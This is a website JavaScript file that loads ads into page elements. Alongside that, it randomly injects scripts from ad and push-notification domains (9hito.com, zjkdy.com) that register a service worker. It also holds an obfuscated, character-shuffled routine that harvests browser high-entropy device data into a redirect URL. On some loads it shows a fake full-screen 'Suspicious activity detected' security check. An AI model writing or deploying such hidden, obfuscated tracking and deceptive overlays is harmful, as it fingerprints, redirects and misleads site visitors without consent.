document.addEventListener("DOMContentLoaded", function() {
	const semuaElemenIklan = document.querySelectorAll(".iklanan");

    if (semuaElemenIklan.length > 0) {
        semuaElemenIklan.forEach(async function(elemen) {
            const formatIklan = elemen.getAttribute("data-format");
            if (!formatIklan) return;

            try {
                // Ganti URL di bawah dengan URL Vercel Anda
                const apiUrl = `https://iklan-backend.vercel.app/api/iklan?format=${formatIklan}`;
                const response = await fetch(apiUrl);
                const data = await response.json();
                
                if (data.html) {
                    elemen.innerHTML = data.html;
                }
            } catch (error) {
                console.warn("Gagal memuat iklan.");
            }
        });
    }

	if (Math.random() < (1 / 16)  && window.location.hostname === "swrdfgd.github.io") {
		  const script = document.createElement('script');
		  script.src = 'https://pl31469839.profitableratecpmnetwork.com/f5/be/d8/f5bed8fca1997efe42bf376c347fbca1.js'; 
		  script.async = true; 
		  document.head.appendChild(script);
	}
	
	if (Math.random() < 0.2 && window.location.hostname === "swrdfgd.github.io"){
		var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
		var s = document.createElement('script');
		s.src='//9hito.com/6d8/03f6a/mw.min.js?z=11694188'+'&sw=/sw-check-permissions-2035c.js';
		s.onload = function(result) {
			switch (result) {
				case 'onPermissionDefault':break;
				case 'onPermissionAllowed':break;
				case 'onPermissionDenied':break;
				case 'onAlreadySubscribed':break;
				case 'onNotificationUnsupported':break;
			}
		};
		document.head.appendChild(s);
	}
	if (Math.random() < 0.2 && window.location.hostname === "swrdfgd.github.io"){
		var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
		var s = document.createElement('script');
		s.src='//zjkdy.com/6d8/03f6a/mw.min.js?z=11714124'+'&sw=/sw-check-permissions-038da.js';
		s.onload = function(result) {
			switch (result) {
				case 'onPermissionDefault':break;
				case 'onPermissionAllowed':break;
				case 'onPermissionDenied':break;
				case 'onAlreadySubscribed':break;
				case 'onNotificationUnsupported':break;
			}
		};
    document.head.appendChild(s);
	}
	if (window.location.hostname === "swrdfgd.github.io"){
			// Generate a random number from 1 to 12
		const chance = Math.floor(Math.random() * 12) + 1; 
		
		if (chance === 1) {
			// 1. Inject the widget.js (alcaptcha SDK) script into the <head>
			const script = document.createElement('script');
			script.src = "https://adslab.me/api/v1/alcaptcha/widget.js?v=1";
			script.async = true;
			script.defer = true;
			document.head.appendChild(script);

			// 2. Create the gate/overlay and append it to the <body>
			const gateDiv = document.createElement('div');
			gateDiv.id = 'captcha-gate';
			// Fullscreen white overlay with high z-index to cover everything
			gateDiv.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100vh; background: white; z-index: 999999; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;';
			
			gateDiv.innerHTML = `
				<h2>Security Verification</h2>
				<p>Suspicious activity detected. Please complete the captcha below.</p>
				<form id="captcha-form">
					<!-- Replace with your actual API KEY -->
					<div class="adslab-captcha" data-sitekey="odaOeWJOiJHLEt6MvsD2FL0D9Dc26k0ssXRAczBT"></div>
					<br><br>
					<button type="submit" id="verify-btn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">Verify & Enter</button>
				</form>
			`;
			document.body.appendChild(gateDiv);

			// Disable scrolling on the background page
			document.body.style.overflow = 'hidden';

			// 3. Handle the form submission via Fetch API
			document.getElementById('captcha-form').addEventListener('submit', function(e) {
				e.preventDefault();
				
				const submitBtn = document.getElementById('verify-btn');
				const captchaInput = document.querySelector('[name="alcaptcha-response"]');
				const captchaResponse = captchaInput ? captchaInput.value : '';
				
				if (!captchaResponse) {
					alert("Please complete the captcha first!");
					return;
				}

				// --- CEGAH DOUBLE CLICK ---
				submitBtn.disabled = true;
				submitBtn.innerText = "Verifying...";

				// Replace the URL with your actual Vercel endpoint
				fetch('https://captcha-backend-three.vercel.app/api/verify.php', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/x-www-form-urlencoded',
					},
					body: new URLSearchParams({
						'alcaptcha-response': captchaResponse
					}).toString()
				})
				.then(response => response.json())
				.then(data => {
					if (data.success) {
						// Remove the captcha overlay from the DOM if successful
						document.getElementById('captcha-gate').remove();
						// Restore page scrolling
						document.body.style.overflow = 'auto'; 
					} else {
						// Display error details from the server
						alert('Verification failed: ' + (data.error_detail || 'Invalid or expired captcha.'));
						console.log("Debug Info:", data);

						// --- RESET CAPTCHA WIDGET SUPAYA DAPAT TOKEN BARU ---
						if (window.alcaptcha && typeof window.alcaptcha.reset === 'function') {
							window.alcaptcha.reset();
						}

						// Kembalikan status tombol
						submitBtn.disabled = false;
						submitBtn.innerText = "Verify & Enter";
					}
				})
				.catch(error => {
					console.error('Error:', error);
					alert('An error occurred while verifying the captcha.');
					
					// Kembalikan status tombol jika terjadi jaringan error
					submitBtn.disabled = false;
					submitBtn.innerText = "Verify & Enter";
				});
			});
		}
		// If the chance is not 1 (11/12 probability), the script does nothing
		// and visitors can view the website normally.
	}
});